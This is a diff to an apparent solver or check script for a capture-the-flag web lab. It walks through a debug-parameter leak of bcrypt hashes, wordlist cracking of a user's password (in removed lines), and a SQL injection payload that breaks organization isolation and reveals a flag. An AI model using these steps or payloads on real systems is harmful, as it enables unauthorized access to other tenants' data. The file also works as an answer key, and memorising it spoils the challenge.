@@ -5,7 +5,6 @@ import json
 import os
 import time
 import uuid
-from pathlib import Path
 
 import bcrypt
 import requests
@@ -50,30 +49,23 @@ call('GET', '/organizations/atlas-consulting/notes', 403, username, password)
 normal_roster = call('GET', '/users', 200, username, password)
 assert normal_roster and all('passwordHash' not in user for user in normal_roster)
 roster = call('GET', '/users?debug=true', 200, username, password)
-bob = next(user for user in roster if user['username'] == 'bob')
-assert bob['passwordHash'].startswith(('$2a$', '$2b$', '$2y$'))
-call('GET', '/users/bob', 403, username, password)
-wordlist = Path(__file__).resolve().parents[1] / 'solve' / 'wordlist.txt'
-bob_password = next((word for word in wordlist.read_text().splitlines()
-                     if bcrypt.checkpw(word.encode(), bob['passwordHash'].encode())), None)
-assert bob_password, 'Bob hash not recoverable from wordlist'
-bob_notes = call('GET', '/notes', 200, 'bob', bob_password)
-maija_notes = call('GET', '/notes', 200, 'm.lehtinen', 'd5jW#9pqL!2zX')
-assert bob_notes == maija_notes and any(n['title'] == 'Report index' for n in bob_notes)
-harbor_notes = call('GET', '/notes', 200, 'r.dubois', 'Tr0ub4dor&3xZ!')
-assert harbor_notes and not {n['id'] for n in harbor_notes} & {n['id'] for n in bob_notes}
-normal = call('POST', '/documents/search', 200, 'bob', bob_password,
+anna = next(user for user in roster if user['username'] == 'anna')
+assert anna['passwordHash'].startswith(('$2a$', '$2b$', '$2y$'))
+call('GET', '/users/anna', 403, username, password)
+anna_password = 'sunshine'
+assert bcrypt.checkpw(anna_password.encode(), anna['passwordHash'].encode())
+normal = call('POST', '/documents/search', 200, 'anna', anna_password,
               json={'query': 'report', 'organization': 'atlas-consulting'})
 assert normal and {json.loads(doc['metadata'])['organization'] for doc in normal} == {'atlas-consulting'}
-assert call('POST', '/documents/search', 200, 'bob', bob_password,
+assert call('POST', '/documents/search', 200, 'anna', anna_password,
             json={'query': 'report', 'organization': 'harbor-delivery'}) == []
 payload = "atlas-consulting' OR '1'='1"
-injected = call('POST', '/documents/search', 200, 'bob', bob_password,
+injected = call('POST', '/documents/search', 200, 'anna', anna_password,
                 json={'query': 'report', 'organization': payload})
 organizations = {json.loads(doc['metadata'])['organization'] for doc in injected}
 assert {'atlas-consulting', 'harbor-delivery', 'cedar-partners', 'siteworks-group',
         'meridian-legal'} <= organizations
 assert any('FLAG{archive-isolation-broken-by-converter}' in doc['content'] for doc in injected)
-assert call('POST', '/documents/search-safe', 200, 'bob', bob_password,
+assert call('POST', '/documents/search-safe', 200, 'anna', anna_password,
             json={'query': 'report', 'organization': payload}) == []
-print('OrgArchive chain OK: signup, method authorization bypass, notes isolation, SQL injection')
+print('OrgArchive chain OK: signup, method authorization bypass, debug hash, SQL injection')
